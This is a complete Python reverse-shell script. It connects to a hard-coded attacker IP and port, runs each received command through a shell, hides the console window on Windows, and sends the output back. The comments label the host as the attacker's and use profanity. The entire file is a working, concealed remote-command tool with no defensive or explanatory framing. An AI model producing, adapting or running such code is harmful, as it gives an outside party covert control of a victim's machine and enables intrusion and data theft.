import socket
import subprocess
import os

def reverse_shell():
    host = '192.168.0.152'  # Attacker's fucking IP address
    port = 4444           # Attacker's goddamn port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break

        # Use CREATE_NO_WINDOW to suppress cmd visibility on Windows
        output = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            creationflags=0x08000000  # CREATE_NO_WINDOW flag
        )
        result = output.stdout + output.stderr

        s.send(result.encode())

    s.close()

if __name__ == "__main__":
    reverse_shell()